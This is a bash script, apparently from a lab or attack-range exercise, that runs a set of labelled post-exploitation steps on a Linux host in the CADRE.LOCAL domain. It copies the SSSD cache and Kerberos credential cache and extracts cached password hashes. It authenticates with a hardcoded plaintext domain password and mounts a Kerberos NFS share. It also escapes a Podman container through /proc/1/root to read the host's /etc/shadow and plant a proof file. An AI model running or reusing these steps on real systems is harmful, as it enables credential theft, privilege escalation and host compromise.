#!/bin/bash
# Branch D attack execution on linux01: WT045, WT047, WT048 (WT046 confirmed)
set -x

echo "=== WT045: SSSD Ticket Extraction (fixed glob) ==="
sudo sh -c 'cp /var/lib/sss/db/cache_cadre.local.ldb /tmp/sssd_cache.ldb && chmod 644 /tmp/sssd_cache.ldb'
echo "copied cache_cadre.local.ldb ($(stat -c%s /tmp/sssd_cache.ldb) bytes)"
if command -v ldbsearch >/dev/null 2>&1; then
  echo "--- ldbsearch cachedPassword ---"
  ldbsearch -H /tmp/sssd_cache.ldb '(cachedPassword=*)' cachedPassword name 2>/dev/null | head -25 || true
else
  echo "--- strings fallback ---"
  strings /tmp/sssd_cache.ldb 2>/dev/null | grep -iE 'cachedPassword|krbPrincipalName|^name:' | head -15 || true
fi
echo "--- ccache_CADRE.LOCAL (SSSD credential cache) ---"
sudo cp /var/lib/sss/db/ccache_CADRE.LOCAL /tmp/ccache_sssd 2>/dev/null && sudo chmod 644 /tmp/ccache_sssd && echo "copied ccache ($(stat -c%s /tmp/ccache_sssd) bytes)" || echo "no sssd ccache"

echo "=== WT047: NFS Kerberos Mount ==="
echo "--- kinit chief_command (valid domain TGT) ---"
echo 'C0mm@nd_Ch1ef!' | kinit chief_command@CADRE.LOCAL 2>&1
klist 2>&1 | head -8
echo "--- mount secure-share with sec=krb5p ---"
sudo mkdir -p /mnt/cadre-nfs
sudo mount -t nfs4 -o sec=krb5p localhost:/exports/secure-share /mnt/cadre-nfs 2>&1
mount | grep cadre-nfs && echo "MOUNT_OK" && sudo ls -la /mnt/cadre-nfs || echo "MOUNT_FAIL"

echo "=== WT048: Podman Container Escape ==="
echo "--- start cadre-monitor ---"
sudo podman start cadre-monitor 2>&1
sleep 2
echo "--- unshare -r id (privileged escape) ---"
sudo podman exec cadre-monitor unshare -r id 2>&1 || echo "UNSHARE_FAIL"
echo "--- read host shadow via escape ---"
sudo podman exec cadre-monitor cat /proc/1/root/etc/shadow 2>/dev/null | head -3 || echo "SHADOW_READ_FAIL"
echo "--- create host file via escape (proof) ---"
sudo podman exec cadre-monitor sh -c 'touch /proc/1/root/tmp/cadre-escape-proof && echo ESCAPE_PROOF_OK' 2>&1 || true
ls -la /tmp/cadre-escape-proof 2>/dev/null && echo "HOST_FILE_CREATED" || echo "no proof file"
echo "=== BRANCH_D_ATTACK_DONE ==="
